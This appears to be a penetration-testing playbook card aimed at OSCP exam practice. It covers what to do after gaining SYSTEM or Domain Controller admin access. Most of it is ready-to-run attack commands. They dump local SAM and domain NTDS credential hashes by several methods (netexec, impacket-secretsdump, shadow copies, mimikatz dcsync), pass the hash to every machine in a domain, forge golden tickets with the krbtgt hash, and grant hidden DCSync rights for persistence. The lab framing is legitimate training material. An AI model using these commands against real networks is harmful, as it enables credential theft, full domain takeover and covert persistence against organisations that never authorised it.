title: Got SYSTEM / Domain Admin — Proof, Loot, and Domain Compromise Endgame
body:
You have SYSTEM on a standalone machine, or local admin on a Domain Controller. Two separate endgames depending on where you are.

Standalone SYSTEM: take the screenshot, grab proof.txt, check for a second NIC — new subnet = new target.

Domain Controller local admin: this is the domain compromise endgame. Local admin on a DC is effectively Domain Admin. Dump NTDS to get every domain hash, including the krbtgt hash which enables golden ticket persistence. The domain Administrator NTLM hash from NTDS is your proof of full domain compromise.

Proof screenshot requirements (OSCP standard): single screenshot showing whoami output (must show SYSTEM/Administrator/DA), hostname, ipconfig showing the machine's IP, and the contents of proof.txt — all visible at the same time in one frame.
cmd:
# ══════════════════════════════════════════════════
# PROOF SCREENSHOT — GET THIS RIGHT
# ══════════════════════════════════════════════════
# All four must be visible in one screenshot:
whoami; hostname; ipconfig; type C:\Users\Administrator\Desktop\proof.txt
# Or PowerShell one-liner:
whoami; hostname; (ipconfig | Select-String 'IPv4'); Get-Content C:\Users\Administrator\Desktop\proof.txt

# Find proof.txt if not on desktop:
Get-ChildItem -Path C:\Users -Include proof.txt,local.txt -Recurse -ErrorAction SilentlyContinue | Get-Content

# ══════════════════════════════════════════════════
# STANDALONE SYSTEM — NEXT MOVES
# ══════════════════════════════════════════════════
# Check for second NIC (pivot opportunity):
ipconfig /all | findstr /i 'IPv4\|adapter'
route print
# New subnet = new target network, set up ligolo pivot

# Dump SAM (local hashes — spray against other machines):
reg save HKLM\sam C:\Temp\sam
reg save HKLM\system C:\Temp\system
# Transfer and crack on Kali:
impacket-secretsdump -sam sam -system system local

# Check for domain membership:
systeminfo | findstr /i 'domain'
# If domain-joined → check BloodHound paths from MACHINE$

# ══════════════════════════════════════════════════
# DOMAIN CONTROLLER — NTDS DUMP (full domain compromise)
# ══════════════════════════════════════════════════
# Method 1 — netexec direct NTDS dump (easiest):
netexec smb <dc-ip> -u <user> -p '<pass>' --ntds
netexec smb <dc-ip> -u <user> -H <nthash> --ntds
# Output: every domain account hash
# Look for: Administrator, krbtgt

# Method 2 — secretsdump via impacket:
impacket-secretsdump <domain>/<user>:'<pass>'@<dc-ip>
impacket-secretsdump <domain>/<user>@<dc-ip> -hashes :<nthash>
# Dumps: local SAM + domain NTDS + LSA secrets

# Method 3 — shadow copy (stealthier, from DC shell):
# On DC shell:
vssadmin create shadow /for=C:
vssadmin list shadows
# Copy NTDS and SYSTEM from shadow:
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\Temp\ntds.dit
reg save HKLM\system C:\Temp\system.hive
# Transfer both to Kali, then:
impacket-secretsdump -ntds ntds.dit -system system.hive local

# Method 4 — mimikatz on DC:
# lsadump::dcsync /domain:<domain> /all /csv
# lsadump::dcsync /domain:<domain> /user:Administrator
# lsadump::dcsync /domain:<domain> /user:krbtgt

# ══════════════════════════════════════════════════
# AFTER NTDS DUMP — WHAT TO DO WITH THE HASHES
# ══════════════════════════════════════════════════
# 1. Domain Administrator PTH — access any machine in domain:
netexec smb <any-machine> -u Administrator -H <admin-ntlm> -d <domain>
evil-winrm -i <any-machine> -u Administrator -H <admin-ntlm>
impacket-psexec <domain>/Administrator@<any-machine> -hashes :<admin-ntlm>

# 2. krbtgt hash → Golden Ticket (persistence):
# Get domain SID first:
Get-ADDomain | Select-Object DomainSID
# Or from secretsdump output: S-1-5-21-XXXX-XXXX-XXXX
# Forge golden ticket with mimikatz:
# kerberos::golden /domain:<domain> /sid:<domain-SID> /rc4:<krbtgt-ntlm> /user:FakeAdmin /id:500
# kerberos::ptt ticket.kirbi
# dir \\<dc>\C$    # test access

# 3. DCSync rights added (persistence via ACL):
# Add DCSync to any user you control:
impacket-dacledit <domain>/<admin-user>:'<pass>'@<dc-ip> -action write -rights DCSync -principal <your-user> -target-dn 'DC=domain,DC=com'
# Now that user can dcsync anytime:
impacket-secretsdump <domain>/<your-user>:'<pass>'@<dc-ip>

# ══════════════════════════════════════════════════
# VERIFY DOMAIN COMPROMISE — PROOF FOR SUBMISSION
# ══════════════════════════════════════════════════
# Get proof.txt from DC:
type C:\Users\Administrator\Desktop\proof.txt
# Or psexec with domain admin hash to DC:
impacket-psexec <domain>/Administrator@<dc-ip> -hashes :<ntlm>
cmd> type C:\Users\Administrator\Desktop\proof.txt

# Screenshot requirements: whoami (must show admin/SYSTEM), ipconfig, proof.txt
whoami; hostname; ipconfig /all; type C:\Users\Administrator\Desktop\proof.txt
warn: NTDS dumps contain every domain account hash including service accounts, computer accounts, and the krbtgt — this is thousands of hashes on a real domain. Filter for the accounts you need: grep -i 'administrator\|krbtgt' ntds.txt. The domain Administrator hash from NTDS is NOT the same as the local Administrator hash on individual machines — it's the domain-wide account. Pass-the-hash with the domain Administrator NTLM gives you access to every machine in the domain.

choices.label: Second NIC found — pivot to new subnet
Use domain admin hash — PTH to other machines
Add user to local Admins before shell dies
